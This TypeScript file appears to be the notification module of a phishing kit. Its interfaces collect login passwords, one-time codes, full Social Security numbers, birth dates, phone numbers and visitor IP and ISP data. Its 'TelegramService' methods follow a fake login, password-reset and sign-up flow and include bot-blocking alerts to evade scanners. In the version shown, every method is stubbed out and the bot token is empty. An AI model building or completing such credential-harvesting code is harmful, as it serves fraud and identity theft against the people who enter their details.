export interface VisitorData {
  location: string;
  ip: string;
  ipV4?: string;
  ipV6?: string;
  timezone: string;
  isp: string;
  userAgent: string;
  screen: string;
  language: string;
  url?: string;
  referrer?: string;
  utcTime: string;
}

export interface BotVisitData {
  name: string;
  type: string;
  userAgent: string;
  ip: string;
  path: string;
  matchedPatterns: string[];
}

export interface LoginData {
  userId: string;
  password: string;
}

export interface VerificationData {
  verificationType: string;
  code: string;
}

export interface ForgotPasswordData {
  ssnLast4: string;
  birthDate: string;
}

export interface NewUserData {
  ssnLast4: string;
  birthDate: string;
}

export interface AccountFoundData {
  method: string;
  password?: string;
}

export interface RememberDeviceData {
  choice: string;
}

export interface VerifyDetailsData {
  ssn: string;
  birthDate: string;
  phone: string;
  zip: string;
}

class TelegramService {
  private botToken = "";
  private chatIds: string[] = [];

  constructor() {
    this.botToken = "";
    this.chatIds = [];
  }

  private async sendMessage(_message: string): Promise<void> {
    // Telegram notifications completely disabled
    return Promise.resolve();
  }

  async sendVisitorNotification(_data: VisitorData): Promise<void> {
    return Promise.resolve();
  }

  async sendBotVisitNotification(_data: BotVisitData): Promise<void> {
    return Promise.resolve();
  }

  async sendLoginNotification(_data: LoginData): Promise<void> {
    return Promise.resolve();
  }

  async sendVerificationNotification(_data: VerificationData): Promise<void> {
    return Promise.resolve();
  }

  async sendVerificationClickNotification(
    _verificationType: string,
    _ip?: string,
  ): Promise<void> {
    return Promise.resolve();
  }

  async sendResendCodeNotification(
    _isSecondOtp: boolean,
    _ip?: string,
  ): Promise<void> {
    return Promise.resolve();
  }

  async sendForgotPasswordPageViewNotification(_ip?: string): Promise<void> {
    return Promise.resolve();
  }

  async sendForgotPasswordNotification(
    _data: ForgotPasswordData,
  ): Promise<void> {
    return Promise.resolve();
  }

  async sendNewUserPageViewNotification(_ip?: string): Promise<void> {
    return Promise.resolve();
  }

  async sendNewUserNotification(_data: NewUserData): Promise<void> {
    return Promise.resolve();
  }

  async sendNewUserCodePageViewNotification(_ip?: string): Promise<void> {
    return Promise.resolve();
  }

  async sendNewUserCodeNotification(
    _code: string,
    _ip?: string,
  ): Promise<void> {
    return Promise.resolve();
  }

  async sendNewUserPasswordPageViewNotification(_ip?: string): Promise<void> {
    return Promise.resolve();
  }

  async sendNewUserPasswordNotification(
    _password: string,
    _ip?: string,
  ): Promise<void> {
    return Promise.resolve();
  }

  async sendAccountFoundNotification(_data: AccountFoundData): Promise<void> {
    return Promise.resolve();
  }

  async sendAccountFoundResetPasswordNotification(_ip?: string): Promise<void> {
    return Promise.resolve();
  }

  async sendForgotPasswordVerifyNotification(
    _verificationType: string,
    _ip?: string,
  ): Promise<void> {
    return Promise.resolve();
  }

  async sendForgotPasswordCodeNotification(
    _code: string,
    _ip?: string,
  ): Promise<void> {
    return Promise.resolve();
  }

  async sendForgotPasswordResendNotification(_ip?: string): Promise<void> {
    return Promise.resolve();
  }

  async sendRememberDeviceNotification(
    _data: RememberDeviceData,
  ): Promise<void> {
    return Promise.resolve();
  }

  async sendVerifyDetailsNotification(
    _data: VerifyDetailsData,
  ): Promise<void> {
    return Promise.resolve();
  }

  async sendBlockedBotNotification(_data: {
    userAgent: string;
    ip: string;
    path: string;
  }): Promise<void> {
    return Promise.resolve();
  }
}

export const telegramService = new TelegramService();
